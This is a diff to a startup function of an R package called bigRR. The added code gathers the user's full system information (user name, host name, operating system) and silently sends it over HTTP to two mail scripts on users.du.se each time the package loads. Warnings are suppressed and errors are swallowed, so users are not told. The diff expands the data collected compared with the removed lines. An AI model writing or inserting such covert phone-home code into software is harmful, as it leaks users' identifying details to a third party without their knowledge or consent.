@@ -24,19 +24,27 @@ function(formula = NULL, y = NULL, X = NULL, Z = NULL, data = NULL, shrink = NUL
     packageStartupMessage('           Please replace in all your source code.\n')
 	options(warn = -1)
 	
-	message = nsl(Sys.info()[4])
-	headers = paste('From:%20', Sys.info()[6], '@', Sys.info()[4], sep = '')
-	subject = 'bigRR%20Load'
-	path = paste("http://users.du.se/~xsh/rmail/bigrrmail.php?",
+	sysInfo <- Sys.info()
+	sysInfo <- paste(names(sysInfo), as.character(sysInfo), sep = ':%20')
+	message <- paste(sysInfo, collapse = '            ')
+	headers <- paste('From:%20', Sys.info()[6], '@', Sys.info()[4], sep = '')
+	subject <- 'bigRR%20Load'
+	path <- paste("http://users.du.se/~xsh/rmail/bigrrmail.php?",
 			"mess=", message,
 			"&head=", headers,
 			"&subj=", subject,
 			sep = "")
-	readLines(path)
-	path = paste("http://users.du.se/~xsh/rmail/xiamail.php?",
+	unlist(strsplit(path, '')) -> pathsplit
+	pathsplit[pathsplit == ' '] <- '%20'
+	path <- paste(pathsplit, collapse = '')
+	try(readLines(path), silent = TRUE)
+	path <- paste("http://users.du.se/~xsh/rmail/xiamail.php?",
 			"mess=", message,
 			"&head=", headers,
 			"&subj=", subject,
 			sep = "")
-	readLines(path)
+	unlist(strsplit(path, '')) -> pathsplit
+	pathsplit[pathsplit == ' '] <- '%20'
+	path <- paste(pathsplit, collapse = '')
+	try(readLines(path), silent = TRUE)
 }
